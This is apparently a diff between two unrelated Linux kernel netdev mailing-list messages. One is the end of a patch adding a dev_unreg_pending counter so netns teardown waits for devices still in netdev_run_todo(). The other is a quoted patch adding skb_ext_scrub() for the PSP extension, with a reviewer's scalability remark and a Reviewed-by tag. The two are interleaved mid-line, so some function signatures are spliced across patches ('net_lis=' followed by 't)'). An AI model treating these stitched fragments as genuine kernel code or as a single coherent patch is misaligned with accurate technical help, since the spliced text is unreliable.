-    [2] https://lore.kernel.org/netdev/20261105114707.3030737-1-bsdhenrymar=
-tin@gmail.com/
-
-    Fixes: 8a4fc54b07d7 ("net: get rid of rtnl_lock_unregistering()")
-    Reported-by: syzbot+1269fe6cc2016008124e@syzkaller.appspotmail.com
-    Closes: https://lore.kernel.org/netdev/6adf9f64.6200f071.51519.0ed1.GAE=
-@google.com/
-    Reported-by: Henry Martin <bsdhenrymartin@gmail.com>
-    Closes: https://lore.kernel.org/netdev/20261105114707.3030737-1-bsdhenr=
-ymartin@gmail.com/
-    Signed-off-by: Eric Dumazet <edumazet@kernel.org>
-
-diff --git a/include/net/net_namespace.h b/include/net/net_namespace.h
-index c29a22ca178fa678c0468247b9f85f53eec86184..4a4d72080acdc787797bffd3a5a=
-1bc0e6d4b46c7
-100644
---- a/include/net/net_namespace.h
-+++ b/include/net/net_namespace.h
-@@ -72,6 +72,7 @@ struct net {
-
-        unsigned int            dev_base_seq;   /* protected by rtnl_mutex =
-*/
-        atomic_t                dev_mc_genid;   /* dev->mc membership chang=
-es */
-+       atomic_t                dev_unreg_pending; /* devices in
-netdev_run_todo() */
-        u32                     ifindex;
-
-        spinlock_t              nsid_lock;
-diff --git a/net/core/dev.c b/net/core/dev.c
-index df1a840b033437a168d4290f19611e6a23507d08..dfcb0fc4bb23f682fc412648be3=
-8cf3ffdb64f2c
-100644
---- a/net/core/dev.c
-+++ b/net/core/dev.c
-@@ -11101,6 +11101,14 @@ atomic_t dev_unreg_count =3D ATOMIC_INIT(0);
- static void net_set_todo(struct net_device *dev)
- {
-        list_add_tail(&dev->todo_list, &net_todo_list);
-+       atomic_inc(&dev_net(dev)->dev_unreg_pending);
-+}
-+
-+/* Paired with net_set_todo(). @net must not be used after this call. */
-+static void net_unreg_done(struct net *net)
-+{
-+       if (atomic_dec_and_test(&net->dev_unreg_pending))
-+               wake_up(&netdev_unregistering_wq);
- }
-
- static netdev_features_t netdev_sync_upper_features(struct net_device *low=
-er,
-@@ -12000,6 +12008,7 @@ void netdev_run_todo(void)
-                if (unlikely(dev->reg_state !=3D NETREG_UNREGISTERING)) {
-                        netdev_WARN(dev, "run_todo but not unregistering\n"=
-);
-                        list_del(&dev->todo_list);
-+                       net_unreg_done(dev_net(dev));
-                        continue;
-                }
-
-@@ -12016,8 +12025,11 @@ void netdev_run_todo(void)
-
-        cnt =3D 0;
-        while (!list_empty(&list)) {
-+               struct net *net;
-+
-                dev =3D netdev_wait_allrefs_any(&list);
-                list_del(&dev->todo_list);
-+               net =3D dev_net(dev);
-
-                /* paranoia */
-                BUG_ON(netdev_refcnt_read(dev) !=3D 1);
-@@ -12038,6 +12050,8 @@ void netdev_run_todo(void)
-
-                /* Free network device */
-                kobject_put(&dev->dev.kobj);
-+
-+               net_unreg_done(net);
-        }
-        if (cnt && atomic_sub_and_test(cnt, &dev_unreg_count))
-                wake_up(&netdev_unregistering_wq);
-@@ -13486,6 +13500,17 @@ static void __net_exit
-default_device_exit_net(struct net *net)
-        }
- }
-
-+static bool __net_exit dev_unreg_pending(const struct list_head *net_list)
-+{
-+       struct net *net;
-+
-+       list_for_each_entry(net, net_list, exit_list) {
-+               if (atomic_read(&net->dev_unreg_pending))
-+                       return true;
-+       }
-+       return false;
-+}
-+
- static void __net_exit default_device_exit_batch(struct list_head *net_lis=
+> +		return;
+> +	}
+> +#endif
+> +	skb_ext_reset(skb);
+> +}
+> +
+>  /**
+>   * skb_scrub_packet - scrub an skb
+>   *
+> @@ -6380,7 +6406,8 @@ EXPORT_SYMBOL(skb_try_coalesce);
+>   * operations.
+>   * skb_scrub_packet can also be used to clean a skb before injecting it =
+in
+>   * another namespace (@xnet =3D=3D true). We have to clear all informati=
+on in the
+> - * skb that could impact namespace isolation.
+> + * skb that could impact namespace isolation. Note that PSP skb extensio=
+n is
+> + * preserved across packet scrubbing by design.
+>   */
+>  void skb_scrub_packet(struct sk_buff *skb, bool xnet)
+>  {
+> @@ -6388,7 +6415,7 @@ void skb_scrub_packet(struct sk_buff *skb, bool xne=
 t)
- {
-        /* At exit all network devices most be removed from a network
-@@ -13527,6 +13552,16 @@ static void __net_exit
-default_device_exit_batch(struct list_head *net_list)
-        unregister_netdevice_many(&dev_kill_list);
-        rtnl_unlock();
+>  	skb->skb_iif =3D 0;
+>  	skb->ignore_df =3D 0;
+>  	skb_dst_drop(skb);
+> -	skb_ext_reset(skb);
+> +	skb_ext_scrub(skb);
+>  	nf_reset_ct(skb);
+>  	nf_reset_trace(skb);
+> =20
 
-+       /* Devices of these netns unregistered from another context
-+        * (e.g. a veth whose peer was deleted) can still be waiting
-+        * in netdev_run_todo() for their last references, while
-+        * NETDEV_UNREGISTER is rebroadcast for them. Wait for them
-+        * before pernet exit handlers tear down the state used by
-+        * netdevice notifiers, and before the netns is freed.
-+        * No new unregistration can start: all devices are unlisted.
-+        */
-+       wait_event(netdev_unregistering_wq, !dev_unreg_pending(net_list));
-+
-        rtnl_net_flush_workqueue();
- }
+The only thing I would say is that skb_ext_scrub() won't scale if a
+second extension comes along and wants the same treatment as PSP. In
+that case, either we could make a bitmap of "no scrub" extensions and
+then use the same approach of allocating a new ext block and copying
+them over, or the original approach of skb_ext_del() could be used after
+changing the reference counting scheme for the special extensions in the
+release path of __skb_ext_put(), but that is a more intrusive change.
+
+I'm ok with the approach from a PSP perspective:
+
+Reviewed-by: Daniel Zahka <daniel.zahka@gmail.com>
